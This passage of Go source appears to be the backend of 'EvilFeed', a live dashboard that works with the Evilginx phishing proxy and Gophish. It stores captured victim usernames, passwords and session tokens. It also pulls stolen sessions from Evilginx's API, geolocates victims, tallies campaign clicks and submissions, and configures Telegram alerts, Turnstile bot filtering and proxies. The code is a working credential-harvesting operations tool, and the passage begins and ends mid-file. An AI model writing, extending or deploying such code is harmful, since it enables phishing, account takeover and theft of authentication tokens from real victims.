	if err := json.Unmarshal(msg, &e); err != nil {
		log.Println("Error unmarshalling event:", err)
		return
	}
	if e.Timestamp == 0 {
		e.Timestamp = time.Now().UnixMilli()
	}

	// Geo lookup: try MaxMind first, then IP-API fallback
	if e.IP != "" && (e.Geo.City == "" && e.Geo.Country == "" && e.Geo.Lat == 0 && e.Geo.Lon == 0) {
		if geo := lookupGeoIP(e.IP); geo != nil {
			e.Geo = *geo
		}
	}

	_, err := db.Exec(`
		INSERT INTO events (timestamp, type, phishlet, ip, username, password, session_id, tokens, geo_city, geo_country, geo_lat, geo_lon, score, message, rid)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
		e.Timestamp, e.Type, e.Phishlet, e.IP, e.Username, e.Password, e.SessionID, e.Tokens,
		e.Geo.City, e.Geo.Country, e.Geo.Lat, e.Geo.Lon, e.Score, e.Message, e.RID,
	)
	if err != nil {
		log.Println("DB save error:", err)
	}
}

func authMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		cookie, err := r.Cookie("session_token")
		if err != nil || !isValidSession(cookie.Value) {
			if r.Header.Get("Content-Type") == "application/json" {
				http.Error(w, "Unauthorized", http.StatusUnauthorized)
			} else {
				http.Redirect(w, r, "/login", http.StatusFound)
			}
			return
		}
		next(w, r)
	}
}

func clientIP(r *http.Request) string {
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return host
}

func recordFailedAttempt(ip string) (locked bool, until time.Time) {
	attemptMutex.Lock()
	defer attemptMutex.Unlock()
	info, ok := loginAttempts[ip]
	if !ok {
		info = &attemptInfo{}
		loginAttempts[ip] = info
	}
	now := time.Now()
	if now.Before(info.LockedUntil) {
		return true, info.LockedUntil
	}
	info.Count++
	if info.Count >= 5 {
		info.LockedUntil = now.Add(10 * time.Minute)
		info.Count = 0
		return true, info.LockedUntil
	}
	return false, time.Time{}
}

func resetAttempts(ip string) {
	attemptMutex.Lock()
	defer attemptMutex.Unlock()
	delete(loginAttempts, ip)
}

func createSession() string {
	token := generateRandomString(32)
	sessionMutex.Lock()
	sessionStore[token] = sessionInfo{Expires: time.Now().Add(24 * time.Hour)}
	sessionMutex.Unlock()
	return token
}

func startCaptchaJanitor() {
	go func() {
		ticker := time.NewTicker(15 * time.Minute)
		defer ticker.Stop()
		for range ticker.C {
			now := time.Now()
			captchaMutex.Lock()
			for k, v := range captchaStore {
				if now.After(v.Expires) {
					delete(captchaStore, k)
				}
			}
			captchaMutex.Unlock()
		}
	}()
}

func secureSessionCookie(r *http.Request, name, value string) *http.Cookie {
	secure := r.TLS != nil || strings.EqualFold(r.Header.Get("X-Forwarded-Proto"), "https")
	return &http.Cookie{
		Name:     name,
		Value:    value,
		Path:     "/",
		HttpOnly: true,
		SameSite: http.SameSiteLaxMode,
		Secure:   secure,
		Expires:  time.Now().Add(24 * time.Hour),
	}
}

func loginPageHandler(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "./app/login.html")
}

// persistAndBroadcast saves an event and broadcasts it to connected clients.
func persistAndBroadcast(e *Event) error {
	if e.Timestamp == 0 {
		e.Timestamp = time.Now().UnixMilli()
	}

	// Deduplication: Check for duplicate events within the last 5 minutes
	// For credentials/session events, check by IP + phishlet + type + username
	if e.Type == "credentials" || e.Type == "session" {
		fiveMinAgo := e.Timestamp - 300000 // 5 minutes in milliseconds
		var count int
		err := db.QueryRow(`
			SELECT COUNT(*) FROM events
			WHERE type = ? AND ip = ? AND phishlet = ? AND username = ? AND timestamp > ?`,
			e.Type, e.IP, e.Phishlet, e.Username, fiveMinAgo).Scan(&count)
		if err == nil && count > 0 {
			// Duplicate found - update existing instead of inserting new
			// SQLite doesn't support ORDER BY/LIMIT in UPDATE, so use subquery
			db.Exec(`
				UPDATE events SET password = ?, tokens = ?, timestamp = ?, message = ?, rid = COALESCE(NULLIF(?, ''), rid)
				WHERE id = (SELECT id FROM events WHERE type = ? AND ip = ? AND phishlet = ? AND username = ? AND timestamp > ? ORDER BY timestamp DESC LIMIT 1)`,
				e.Password, e.Tokens, e.Timestamp, e.Message, e.RID,
				e.Type, e.IP, e.Phishlet, e.Username, fiveMinAgo)
			// Still broadcast the update (no terminal logging to keep password visible)
			if globalHub != nil {
				data, _ := json.Marshal(e)
				globalHub.broadcast <- data
			}
			return nil
		}
	}

	// For bot events, deduplicate by IP within 1 minute
	if e.Type == "bot" {
		oneMinAgo := e.Timestamp - 60000
		var count int
		err := db.QueryRow(`
			SELECT COUNT(*) FROM events
			WHERE type = 'bot' AND ip = ? AND timestamp > ?`,
			e.IP, oneMinAgo).Scan(&count)
		if err == nil && count > 0 {
			log.Printf("[DEDUP] Ignoring duplicate bot event from %s", e.IP)
			return nil // Silently ignore duplicate bot events
		}
	}

	_, err := db.Exec(`
		INSERT INTO events (timestamp, type, phishlet, ip, username, password, session_id, tokens, geo_city, geo_country, geo_lat, geo_lon, score, message, rid)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
		e.Timestamp, e.Type, e.Phishlet, e.IP, e.Username, e.Password, e.SessionID, e.Tokens,
		e.Geo.City, e.Geo.Country, e.Geo.Lat, e.Geo.Lon, e.Score, e.Message, e.RID,
	)
	if err != nil {
		return err
	}
	if globalHub != nil {
		data, _ := json.Marshal(e)
		globalHub.broadcast <- data
	}
	return nil
}

func statusHandler(w http.ResponseWriter, r *http.Request) {
	count := 0
	db.QueryRow("SELECT COUNT(*) FROM events").Scan(&count)
	var tele, lure string
	db.QueryRow("SELECT value FROM settings WHERE key = 'telegram_webhook'").Scan(&tele)
	db.QueryRow("SELECT value FROM settings WHERE key = 'lure_url'").Scan(&lure)

	resp := map[string]interface{}{
		"events":      count,
		"webhook_set": strings.TrimSpace(tele) != "",
		"lure_set":    strings.TrimSpace(lure) != "",
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

func testAlertHandler(w http.ResponseWriter, r *http.Request) {
	e := &Event{
		Timestamp: time.Now().UnixMilli(),
		Type:      "test",
		Phishlet:  "system",
		IP:        "127.0.0.1",
		Message:   "Test alert from EvilFeed",
		Score:     0,
	}
	if err := persistAndBroadcast(e); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusOK)
}

func indexHandler(w http.ResponseWriter, r *http.Request) {
	cookie, err := r.Cookie("session_token")
	if err != nil || !isValidSession(cookie.Value) {
		http.Redirect(w, r, "/login", http.StatusFound)
		return
	}
	http.ServeFile(w, r, "./app/index.html")
}

func captchaHandler(w http.ResponseWriter, r *http.Request) {
	n1, _ := rand.Int(rand.Reader, big.NewInt(10))
	n2, _ := rand.Int(rand.Reader, big.NewInt(10))
	num1 := int(n1.Int64()) + 1
	num2 := int(n2.Int64()) + 1

	id := generateRandomString(16)

	captchaMutex.Lock()
	captchaStore[id] = captchaEntry{Answer: num1 + num2, Expires: time.Now().Add(15 * time.Minute)}
	captchaMutex.Unlock()

	json.NewEncoder(w).Encode(map[string]string{
		"id":       id,
		"question": fmt.Sprintf("%d + %d", num1, num2),
	})
}

func verifyCaptchaHandler(w http.ResponseWriter, r *http.Request) {
	var req struct {
		CaptchaID     string `json:"captcha_id"`
		CaptchaAnswer int    `json:"captcha_answer"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	captchaMutex.RLock()
	entry, ok := captchaStore[req.CaptchaID]
	captchaMutex.RUnlock()

	if !ok || time.Now().After(entry.Expires) || entry.Answer != req.CaptchaAnswer {
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]string{"error": "Incorrect captcha"})
		return
	}

	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

func loginAPIHandler(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Password      string `json:"password"`
		CaptchaID     string `json:"captcha_id"`
		CaptchaAnswer int    `json:"captcha_answer"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	ip := clientIP(r)
	attemptMutex.Lock()
	if info, ok := loginAttempts[ip]; ok && time.Now().Before(info.LockedUntil) {
		attemptMutex.Unlock()
		http.Error(w, "Too many attempts, try later", http.StatusTooManyRequests)
		return
	}
	attemptMutex.Unlock()

	// Verify Captcha
	captchaMutex.RLock()
	entry, ok := captchaStore[req.CaptchaID]
	captchaMutex.RUnlock()

	if !ok || time.Now().After(entry.Expires) || entry.Answer != req.CaptchaAnswer {
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]string{"error": "Incorrect captcha"})
		return
	}

	// Clean up used captcha
	captchaMutex.Lock()
	delete(captchaStore, req.CaptchaID)
	captchaMutex.Unlock()

	// Verify Password
	var hash string
	var mustReset int
	err := db.QueryRow("SELECT password_hash, must_reset FROM admin LIMIT 1").Scan(&hash, &mustReset)
	if err != nil {
		http.Error(w, "Server error", http.StatusInternalServerError)
		return
	}

	if !checkPassword(hash, req.Password) {
		if locked, until := recordFailedAttempt(ip); locked {
			w.WriteHeader(http.StatusTooManyRequests)
			json.NewEncoder(w).Encode(map[string]string{"error": fmt.Sprintf("Locked until %s", until.Format(time.RFC822))})
			return
		}
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]string{"error": "Invalid password"})
		return
	}
	resetAttempts(ip)

	// Create Session FIRST (before checking must_reset)
	// This ensures session cookie is set even when password reset is required
	token := createSession()
	http.SetCookie(w, secureSessionCookie(r, "session_token", token))

	if mustReset == 1 {
		json.NewEncoder(w).Encode(map[string]string{"status": "reset_required"})
		return
	}

	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

func changePasswordHandler(w http.ResponseWriter, r *http.Request) {
	var req struct {
		CurrentPassword string `json:"current_password"`
		NewPassword     string `json:"new_password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	var hash string
	err := db.QueryRow("SELECT password_hash FROM admin LIMIT 1").Scan(&hash)
	if err != nil {
		http.Error(w, "Server error", http.StatusInternalServerError)
		return
	}

	if !checkPassword(hash, req.CurrentPassword) {
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]string{"error": "Invalid current password"})
		return
	}

	newHash := hashPassword(req.NewPassword)
	_, err = db.Exec("UPDATE admin SET password_hash = ?, must_reset = 0", newHash)
	if err != nil {
		http.Error(w, "Database error", http.StatusInternalServerError)
		return
	}

	// Create Session
	token := createSession()

	http.SetCookie(w, secureSessionCookie(r, "session_token", token))

	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

// --- Existing Handlers (Wrapped) ---

func getEventsJSON(w http.ResponseWriter, r *http.Request) {
	rows, err := db.Query("SELECT id, timestamp, type, phishlet, ip, username, password, session_id, tokens, geo_city, geo_country, geo_lat, geo_lon, score, message, COALESCE(rid, '') FROM events ORDER BY timestamp DESC LIMIT 500")
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	defer rows.Close()

	var events []Event
	for rows.Next() {
		var e Event
		err := rows.Scan(&e.ID, &e.Timestamp, &e.Type, &e.Phishlet, &e.IP, &e.Username, &e.Password, &e.SessionID, &e.Tokens,
			&e.Geo.City, &e.Geo.Country, &e.Geo.Lat, &e.Geo.Lon, &e.Score, &e.Message, &e.RID)
		if err != nil {
			continue
		}
		events = append(events, e)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(events)
}

func getVisitors(w http.ResponseWriter, r *http.Request) {
	rows, err := db.Query("SELECT id, timestamp, type, phishlet, ip, username, password, session_id, tokens, geo_city, geo_country, geo_lat, geo_lon, score, message, COALESCE(rid, '') FROM events WHERE type IN ('open', 'click') ORDER BY timestamp DESC LIMIT 500")
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	defer rows.Close()

	var events []Event
	for rows.Next() {
		var e Event
		err := rows.Scan(&e.ID, &e.Timestamp, &e.Type, &e.Phishlet, &e.IP, &e.Username, &e.Password, &e.SessionID, &e.Tokens,
			&e.Geo.City, &e.Geo.Country, &e.Geo.Lat, &e.Geo.Lon, &e.Score, &e.Message, &e.RID)
		if err != nil {
			continue
		}
		events = append(events, e)
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(events)
}

// EvilginxSession represents a session from Evilginx's /_sessions API
type EvilginxSession struct {
	ID         int               `json:"id"`
	Phishlet   string            `json:"phishlet"`
	Username   string            `json:"username"`
	Password   string            `json:"password"`
	SessionID  string            `json:"session_id"`
	RemoteAddr string            `json:"remote_addr"`
	UserAgent  string            `json:"useragent"`
	Tokens     string            `json:"tokens"`
	Custom     map[string]string `json:"custom"`
	CreateTime int64             `json:"create_time"`
	UpdateTime int64             `json:"update_time"`
	LandingURL string            `json:"landing_url"`
}

// fetchEvilginxSessions fetches sessions directly from Evilginx's internal API
func fetchEvilginxSessions() []Event {
	if !checkEvilginxAPI() {
		return nil
	}

	resp, err := evilginxClient.Get(getEvilginxAPIURL("/_sessions"))
	if err != nil {
		log.Printf("Failed to fetch sessions from Evilginx: %v", err)
		return nil
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Printf("Evilginx sessions API returned status %d", resp.StatusCode)
		return nil
	}

	var sessions []EvilginxSession
	if err := json.NewDecoder(resp.Body).Decode(&sessions); err != nil {
		log.Printf("Failed to decode Evilginx sessions: %v", err)
		return nil
	}

	// Convert to Event format
	var events []Event
	for _, s := range sessions {
		// Only include sessions with credentials or tokens
		hasCredentials := s.Username != "" && s.Password != ""
		hasTokens := s.Tokens != "" && s.Tokens != "{}" && s.Tokens != "null"

		if !hasCredentials && !hasTokens {
			continue
		}

		eventType := "credentials"
		if hasTokens {
			eventType = "session"
		}

		e := Event{
			ID:        int64(s.ID),
			Timestamp: s.UpdateTime * 1000, // Convert to milliseconds
			Type:      eventType,
			Phishlet:  s.Phishlet,
			IP:        s.RemoteAddr,
			Username:  s.Username,
			Password:  s.Password,
			SessionID: s.SessionID,
			Tokens:    s.Tokens,
			Message:   fmt.Sprintf("Captured from %s", s.Phishlet),
		}

		// Try to enrich with GeoIP
		if geo := lookupGeoIP(s.RemoteAddr); geo != nil {
			e.Geo = *geo
		}

		events = append(events, e)
	}

	return events
}

func getCredentials(w http.ResponseWriter, r *http.Request) {
	// First, try to fetch directly from Evilginx's database via API
	evilginxSessions := fetchEvilginxSessions()

	// Also get credentials from our local events database
	rows, err := db.Query(`
		SELECT id, timestamp, type, phishlet, ip, username, password, session_id, tokens,
		       geo_city, geo_country, geo_lat, geo_lon, score, message, COALESCE(rid, '')
		FROM events
		WHERE (
			(type = 'credentials' AND username != '' AND password != '')
			OR (type = 'session' AND tokens != '' AND tokens != '{}' AND tokens != 'null')
		)
		ORDER BY timestamp DESC LIMIT 500`)
	if err != nil {
		// If local DB fails, just return Evilginx sessions
		if evilginxSessions != nil {
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(evilginxSessions)
			return
		}
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	defer rows.Close()

	var events []Event
	seenSessions := make(map[string]bool) // Track session IDs to avoid duplicates

	// Add Evilginx sessions first (they have the most up-to-date data)
	for _, e := range evilginxSessions {
		events = append(events, e)
		if e.SessionID != "" {
			seenSessions[e.SessionID] = true
		}
	}

	// Add local events, avoiding duplicates
	for rows.Next() {
		var e Event
		err := rows.Scan(&e.ID, &e.Timestamp, &e.Type, &e.Phishlet, &e.IP, &e.Username, &e.Password, &e.SessionID, &e.Tokens,
			&e.Geo.City, &e.Geo.Country, &e.Geo.Lat, &e.Geo.Lon, &e.Score, &e.Message, &e.RID)
		if err != nil {
			continue
		}
		// Skip if we already have this session from Evilginx
		if e.SessionID != "" && seenSessions[e.SessionID] {
			continue
		}
		events = append(events, e)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(events)
}

func resolveGophishDBPath() string {
	home, _ := os.UserHomeDir()
	defaultPath := filepath.Join(home, "Documents", "projects", "evilgophish", "gophish", "gophish.db")
	gophishDBPath := getSetting("gophish_db_path", "")
	if gophishDBPath == "" {
		gophishDBPath = os.Getenv("GOPHISH_DB_PATH")
	}
	if gophishDBPath == "" {
		gophishDBPath = defaultPath
	}
	if _, err := os.Stat(gophishDBPath); os.IsNotExist(err) {
		gophishDBPath = "../gophish/gophish.db"
	}
	return gophishDBPath
}

func openGophishDB() (*sql.DB, error) {
	return sql.Open("sqlite3", resolveGophishDBPath())
}

func getCampaigns(w http.ResponseWriter, r *http.Request) {
	gpDB, err := openGophishDB()
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte("[]"))
		return
	}
	defer gpDB.Close()

	rows, err := gpDB.Query("SELECT id, name, status, created_date FROM campaigns ORDER BY created_date DESC")
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte("[]"))
		return
	}
	defer rows.Close()

	type Campaign struct {
		ID      int64  `json:"id"`
		Name    string `json:"name"`
		Status  string `json:"status"`
		Created string `json:"created_date"`
	}
	var campaigns []Campaign
	for rows.Next() {
		var c Campaign
		var created interface{}
		rows.Scan(&c.ID, &c.Name, &c.Status, &created)
		if t, ok := created.(time.Time); ok {
			c.Created = t.Format(time.RFC3339)
		} else if s, ok := created.(string); ok {
			c.Created = s
		}
		campaigns = append(campaigns, c)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(campaigns)
}

func handleCampaignStats(w http.ResponseWriter, r *http.Request) {
	id := strings.TrimSpace(r.URL.Query().Get("id"))
	if id == "" {
		http.Error(w, "id required", http.StatusBadRequest)
		return
	}

	gpDB, err := openGophishDB()
	if err != nil {
		http.Error(w, "database unavailable", http.StatusInternalServerError)
		return
	}
	defer gpDB.Close()

	var name, status, created string
	_ = gpDB.QueryRow("SELECT name, status, created_date FROM campaigns WHERE id = ?", id).Scan(&name, &status, &created)

	rows, err := gpDB.Query("SELECT status, COUNT(*) FROM results WHERE campaign_id = ? GROUP BY status", id)
	if err != nil {
		http.Error(w, "query failed", http.StatusInternalServerError)
		return
	}
	defer rows.Close()

	typeResp := map[string]int{
		"sent":        0,
		"open":        0,
		"click":       0,
		"credentials": 0,
		"session":     0,
		"reported":    0,
		"other":       0,
	}
	for rows.Next() {
		var st string
		var count int
		if err := rows.Scan(&st, &count); err != nil {
			continue
		}
		switch {
		case strings.HasPrefix(st, "Email Sent") || strings.HasPrefix(st, "SMS Sent"):
			typeResp["sent"] += count
		case strings.Contains(st, "Opened"):
			typeResp["open"] += count
		case strings.Contains(st, "Clicked"):
			typeResp["click"] += count
		case strings.Contains(st, "Submitted"):
			typeResp["credentials"] += count
		case strings.Contains(st, "Captured Session"):
			typeResp["session"] += count
		case strings.Contains(strings.ToLower(st), "reported"):
			typeResp["reported"] += count
		default:
			typeResp["other"] += count
		}
	}

	resp := map[string]interface{}{
		"id":      id,
		"name":    name,
		"status":  status,
		"created": created,
		"counts":  typeResp,
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

func handleSettings(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		// Fetch Telegram config from Evilginx
		telegramCfg := fetchTelegramConfig()
		// Fetch Turnstile config from Evilginx
		turnstileCfg := fetchTurnstileConfig()
		// Fetch Proxy config from Evilginx
		proxyCfg := fetchProxyConfig()

		settings := map[string]interface{}{
			"telegram_bot_token":  telegramCfg.BotToken,
			"telegram_chat_id":    telegramCfg.ChatId,
			"telegram_enabled":    telegramCfg.Enabled,
			"turnstile_sitekey":   turnstileCfg.SiteKey,
			"turnstile_secretkey": turnstileCfg.SecretKey,
			"turnstile_enabled":   turnstileCfg.Enabled,
			"proxy_type":          proxyCfg.Type,
			"proxy_address":       proxyCfg.Address,
			"proxy_port":          proxyCfg.Port,
			"proxy_username":      proxyCfg.Username,
			"proxy_enabled":       proxyCfg.Enabled,
			"lure_url":            getSetting("lure_url", "Contact admin for your link"),
			"gophish_db_path":     getSetting("gophish_db_path", ""),
			"whitelist_path":      getSetting("whitelist_path", ""),
			"listen_addr":         getSetting("listen_addr", ""),
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(settings)
	case http.MethodPost:
		var req struct {
			TelegramBotToken   string `json:"telegram_bot_token"`
			TelegramChatId     string `json:"telegram_chat_id"`
			TurnstileSiteKey   string `json:"turnstile_sitekey"`
			TurnstileSecretKey string `json:"turnstile_secretkey"`
			TurnstileEnabled   *bool  `json:"turnstile_enabled"`
			ProxyType          string `json:"proxy_type"`
			ProxyAddress       string `json:"proxy_address"`
			ProxyPort          int    `json:"proxy_port"`
			ProxyUsername      string `json:"proxy_username"`
			ProxyPassword      string `json:"proxy_password"`
			ProxyEnabled       *bool  `json:"proxy_enabled"`
			LureURL            string `json:"lure_url"`
			GophishDBPath      string `json:"gophish_db_path"`
			WhitelistPath      string `json:"whitelist_path"`
			ListenAddr         string `json:"listen_addr"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "Invalid request", http.StatusBadRequest)
			return
		}

		// Update Telegram config in Evilginx if provided
		if req.TelegramBotToken != "" || req.TelegramChatId != "" {
			if err := updateTelegramConfig(req.TelegramBotToken, req.TelegramChatId); err != nil {
				log.Printf("Failed to update Telegram config: %v", err)
			}
		}

		// Update Turnstile config in Evilginx if provided
		if req.TurnstileSiteKey != "" || req.TurnstileSecretKey != "" || req.TurnstileEnabled != nil {
			if err := updateTurnstileConfig(req.TurnstileSiteKey, req.TurnstileSecretKey, req.TurnstileEnabled); err != nil {
				log.Printf("Failed to update Turnstile config: %v", err)
			}
		}

		// Update Proxy config in Evilginx if provided (applies immediately, no restart needed)
		if req.ProxyType != "" || req.ProxyAddress != "" || req.ProxyPort > 0 || req.ProxyUsername != "" || req.ProxyPassword != "" || req.ProxyEnabled != nil {
			proxyCfg := &ProxyConfig{
				Type:     req.ProxyType,
				Address:  req.ProxyAddress,
				Port:     req.ProxyPort,
				Username: req.ProxyUsername,
				Password: req.ProxyPassword,
			}
			if req.ProxyEnabled != nil {
				proxyCfg.Enabled = *req.ProxyEnabled
			}
			if err := updateProxyConfig(proxyCfg); err != nil {
				log.Printf("Failed to update Proxy config: %v", err)
				http.Error(w, fmt.Sprintf("Failed to apply proxy: %v", err), http.StatusInternalServerError)
				return
			}
		}

		if req.LureURL != "" {
			db.Exec("INSERT OR REPLACE INTO settings (key, value) VALUES ('lure_url', ?)", req.LureURL)
		}
		if req.GophishDBPath != "" {
			db.Exec("INSERT OR REPLACE INTO settings (key, value) VALUES ('gophish_db_path', ?)", req.GophishDBPath)
		}
		if req.WhitelistPath != "" {
			db.Exec("INSERT OR REPLACE INTO settings (key, value) VALUES ('whitelist_path', ?)", req.WhitelistPath)
		}
		if req.ListenAddr != "" {
			db.Exec("INSERT OR REPLACE INTO settings (key, value) VALUES ('listen_addr', ?)", req.ListenAddr)
		}
		w.WriteHeader(http.StatusOK)
	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

func handleInternalSettings(w http.ResponseWriter, r *http.Request) {
	// Only allow localhost
	host, _, _ := net.SplitHostPort(r.RemoteAddr)
	if host != "127.0.0.1" && host != "::1" {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	if r.Method == "POST" {
		var req struct {
			LureURL string `json:"lure_url"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "Invalid request", http.StatusBadRequest)
			return
		}

		_, err := db.Exec("INSERT OR REPLACE INTO settings (key, value) VALUES ('lure_url', ?)", req.LureURL)
		if err != nil {
			http.Error(w, "Database error", http.StatusInternalServerError)
			return
		}
		w.WriteHeader(http.StatusOK)
	}
}

// handleIngestEvent receives events from Evilginx via HTTP POST
// Only accepts connections from localhost for security
func handleIngestEvent(w http.ResponseWriter, r *http.Request) {
	// Only allow localhost connections
	host, _, _ := net.SplitHostPort(r.RemoteAddr)
	if host != "127.0.0.1" && host != "::1" {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var e Event
	if err := json.NewDecoder(r.Body).Decode(&e); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	// Enrich with GeoIP (MaxMind first, then IP-API fallback)
	if e.IP != "" && (e.Geo.City == "" && e.Geo.Country == "" && e.Geo.Lat == 0 && e.Geo.Lon == 0) {
		if geo := lookupGeoIP(e.IP); geo != nil {
			e.Geo = *geo
		}
	}

	if err := persistAndBroadcast(&e); err != nil {
		http.Error(w, "Failed to save event", http.StatusInternalServerError)
		return
	}

	// Events are only shown in the web UI, not in terminal (to keep password visible)
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

func handleWhitelist(w http.ResponseWriter, r *http.Request) {
	whitelistPath := getSetting("whitelist_path", "")
	if whitelistPath == "" {
		whitelistPath = os.Getenv("EVILFEED_WHITELIST_PATH")
	}
	if whitelistPath == "" {
		whitelistPath = "../evilginx3/Custom/whitelist.txt"
	}
	switch r.Method {
	case http.MethodGet:
		content, err := os.ReadFile(whitelistPath)
		ips := []string{}
		if err == nil {
			lines := strings.Split(string(content), "\n")
			seen := make(map[string]bool)
			for _, ln := range lines {
				ln = strings.TrimSpace(ln)
				if ln == "" || seen[ln] {
					continue
				}
				ips = append(ips, ln)
				seen[ln] = true
			}
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(ips)
	case http.MethodPost:
		var req struct {
			IP     string `json:"ip"`
			Action string `json:"action"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "Invalid request", http.StatusBadRequest)
			return
		}
		ip := strings.TrimSpace(req.IP)
		action := strings.ToLower(strings.TrimSpace(req.Action))
		if action == "" {
			action = "add"
		}

		// Load existing entries
		content, _ := os.ReadFile(whitelistPath)
		lines := strings.Split(string(content), "\n")
		existing := make([]string, 0, len(lines))
		seen := make(map[string]bool)
		for _, ln := range lines {
			ln = strings.TrimSpace(ln)
			if ln == "" || seen[ln] {
				continue
			}
			seen[ln] = true
			existing = append(existing, ln)
		}

		switch action {
		case "clear":
			os.WriteFile(whitelistPath, []byte{}, 0644)
		case "remove":
			if ip == "" {
				http.Error(w, "IP required for remove", http.StatusBadRequest)
				return
			}
			filtered := make([]string, 0, len(existing))
			for _, ln := range existing {
				if ln != ip {
					filtered = append(filtered, ln)
				}
			}
			os.WriteFile(whitelistPath, []byte(strings.Join(filtered, "\n")+"\n"), 0644)
		case "add":
			if ip == "" {
				http.Error(w, "IP required for add", http.StatusBadRequest)
				return
			}
			if net.ParseIP(ip) == nil {
				if _, _, err := net.ParseCIDR(ip); err != nil {
					http.Error(w, "Invalid IP/CIDR", http.StatusBadRequest)
					return
				}
			}
			if !seen[ip] {
				existing = append(existing, ip)
				os.WriteFile(whitelistPath, []byte(strings.Join(existing, "\n")+"\n"), 0644)
			}
		default:
			http.Error(w, "Unknown action", http.StatusBadRequest)
			return
		}
		w.WriteHeader(http.StatusOK)
	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

func clearLogs(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		_, err := db.Exec("DELETE FROM events")
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		w.WriteHeader(http.StatusOK)
	}
}

func logoutHandler(w http.ResponseWriter, r *http.Request) {
	cookie, err := r.Cookie("session_token")
	if err == nil {
		sessionMutex.Lock()
		delete(sessionStore, cookie.Value)
		sessionMutex.Unlock()
		http.SetCookie(w, &http.Cookie{
			Name:     "session_token",
			Value:    "",
			Path:     "/",
			Expires:  time.Unix(0, 0),
			MaxAge:   -1,
			HttpOnly: true,
		})
	}
	w.WriteHeader(http.StatusOK)
}

func main() {
	initDB()
	initAuth()
	startCaptchaJanitor()
	hub := newHub()
	globalHub = hub
	go hub.run()

	// Static files
	http.Handle("/app/", http.StripPrefix("/app/", http.FileServer(http.Dir("./app"))))
	// Serve shared assets (e.g., login background) from repository images folder
	http.Handle("/images/", http.StripPrefix("/images/", http.FileServer(http.Dir("../images"))))

	// Public Routes
	http.HandleFunc("/login", loginPageHandler)
	http.HandleFunc("/api/login", loginAPIHandler)
	http.HandleFunc("/api/captcha", captchaHandler)
	http.HandleFunc("/api/verify-captcha", verifyCaptchaHandler)
	http.HandleFunc("/api/change-password", authMiddleware(changePasswordHandler))
	http.HandleFunc("/api/logout", logoutHandler)
	http.HandleFunc("/api/status", authMiddleware(statusHandler))
	http.HandleFunc("/api/test-alert", authMiddleware(testAlertHandler))

	// Protected Routes
	http.HandleFunc("/", indexHandler)
	http.HandleFunc("/events", authMiddleware(getEventsJSON))
	http.HandleFunc("/api/visitors", authMiddleware(getVisitors))
	http.HandleFunc("/api/credentials", authMiddleware(getCredentials))
	http.HandleFunc("/api/campaigns", authMiddleware(getCampaigns))
	http.HandleFunc("/api/campaign_stats", authMiddleware(handleCampaignStats))
	http.HandleFunc("/api/settings", authMiddleware(handleSettings))
	http.HandleFunc("/api/turnstile/sync", authMiddleware(handleTurnstileSync))
	http.HandleFunc("/api/turnstile/push", authMiddleware(handleTurnstilePush))
	http.HandleFunc("/api/telegram/sync", authMiddleware(handleTelegramSync))
